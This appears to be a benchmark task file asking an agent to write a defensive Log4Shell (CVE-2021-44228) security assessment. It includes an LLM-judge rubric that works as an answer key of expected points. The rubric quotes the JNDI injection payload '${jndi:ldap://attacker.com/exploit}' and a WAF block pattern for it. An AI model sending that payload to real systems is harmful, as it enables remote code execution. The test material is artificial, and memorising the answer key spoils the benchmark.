---
id: task_045_t46_cve_research
name: Claw-Eval T46_cve_research
category: security
grading_type: llm_judge
timeout_seconds: 300
workspace_files: []
---

## Prompt

Our security team has discovered that several Java applications are still using Apache Log4j 2.x. We need a comprehensive security assessment of the related vulnerabilities.

Please conduct the following research:
1. Search for and confirm the CVE details for Log4j vulnerabilities, especially CVE-2021-44228 (Log4Shell)
2. Determine the CVSS score, impact scope, and affected versions
3. Research the technical exploit mechanism in depth (e.g., JNDI injection)
4. Find the officially recommended fix versions and mitigation measures
5. Investigate real-world attack cases and their impact (cryptocurrency mining, ransomware, etc.)
6. Search for available detection tools and scanning solutions
7. Review relevant compliance requirements (e.g., CISA's mandatory patching directive)

Please produce a comprehensive security assessment report including:
- Vulnerability summary (CVE ID, CVSS score, impact scope)
- Technical analysis (exploit mechanism, attack vectors)
- Affected versions and remediation options
- Real-world attack cases
- Detection and scanning recommendations
- Compliance requirements and action items

Note: This is research and analysis only. Do NOT send any notifications or take any actions.

Please complete the task in the workspace.

## Expected Behavior

The agent should complete this Claw-Eval task correctly.
Language: `en`
Dataset split: `general`
Original task id: `T46_cve_research`

## Grading Criteria

- [ ] Understands the task request
- [ ] Produces correct and complete result
- [ ] Uses workspace fixtures appropriately when provided

## LLM Judge Rubric

Evaluate the agent's Log4Shell security assessment report by scoring each dimension separately, then compute a weighted average.

For each dimension, count how many key points are present in the response, then compute: dimension_score = covered_points / total_points.

D1. Vulnerability identification (weight 0.15)
    - CVE-2021-44228, known as Log4Shell
    - CVSS score 10.0 (Critical)
    - Affects Apache Log4j 2.x library
    - Disclosed in December 2021

D2. Affected versions (weight 0.13)
    - Versions 2.0-beta9 through 2.14.1 are vulnerable
    - 2.15.0 incomplete fix; 2.16.0 disabled lookups; 2.17.0 fully patched
    - Log4j 1.x not affected by this CVE

D3. Exploit mechanism (weight 0.19)
    - JNDI (Java Naming and Directory Interface) injection
    - Attacker sends crafted string ${jndi:ldap://attacker.com/exploit}
    - Log4j message lookup processes the string
    - Triggers connection to attacker-controlled LDAP/RMI server → RCE

D4. Remediation (weight 0.19)
    - Upgrade to Log4j 2.17.0 or later
    - Set formatMsgNoLookups=true (partial mitigation)
    - Remove JndiLookup.class from classpath
    - WAF rules to block ${jndi: patterns

D5. Real-world impact (weight 0.13)
    - Widespread exploitation within hours of disclosure
    - Cryptocurrency mining / cryptojacking
    - Ransomware (Conti, Khonsari)
    - State-sponsored APT groups

D6. Detection tools (weight 0.10)
    - log4j-scan or open-source scanners
    - SBOM tools (Syft, Grype)

D7. Compliance (weight 0.11)
    - CISA BOD 22-01 (Binding Operational Directive)
    - Mandatory patching for federal agencies
    - CISA Known Exploited Vulnerabilities catalog

Final score = 0.15*D1 + 0.13*D2 + 0.19*D3 + 0.19*D4 + 0.13*D5 + 0.10*D6 + 0.11*D7
